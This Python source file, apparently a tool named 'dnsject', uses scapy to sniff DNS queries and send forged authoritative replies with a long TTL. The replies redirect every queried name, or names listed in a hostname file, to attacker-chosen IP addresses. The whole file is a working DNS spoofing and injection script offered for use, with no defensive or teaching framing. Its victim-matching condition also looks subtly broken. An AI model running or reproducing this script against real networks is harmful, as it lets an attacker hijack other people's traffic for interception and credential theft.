from scapy.all import *
import argparse
import socket


defSpoofIp = ''
victims = {}
fullAttack = True

def spoofPacket(pkt):
	if (pkt.haslayer(DNSQR) and 
		pkt[DNS].qr == 0 and 
		pkt[DNSQR].qtype ==1 and 
		(fullAttack or pkt[DNSQR].qname) in victims):
		#print pkt.show()
		spfPkt = IP(src=pkt[IP].dst, dst=pkt[IP].src)\
				/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)\
				/DNS(id=pkt[DNS].id, qr=1, ancount=1, aa=1, qd=pkt[DNS].qd,
					an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10000, 
						rdata=defSpoofIp if fullAttack else victims[pkt[DNSQR].qname]))
		#print spfPkt.show()
		send(spfPkt)

parser = argparse.ArgumentParser(description="dnsject", add_help=False)
parser.add_argument("-i", help="interface")
parser.add_argument("-h", help="host_names")
parser.add_argument("expression", nargs="*", help="filter")
args = parser.parse_args()
#print args

tsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tsock.connect(("8.8.8.8", 80))
defSpoofIp = tsock.getsockname()[0]
tsock.close()

if args.h:
	fullAttack = False
	with open(args.h) as file:
		for line in file:
			value, key = line.split()
			victims[key+"."] = value
			
#print victims
bpf = "udp port 53"
if args.expression:
	exp = " ".join(args.expression)
	bpf = bpf + " and " + "(" + exp + ")" 
#print bpf
if args.i is None:
	sniff(filter=bpf, prn=spoofPacket)
else:
	sniff(filter=bpf, iface=args.i, prn=spoofPacket)

#dns.qry.name=="blah124.com"
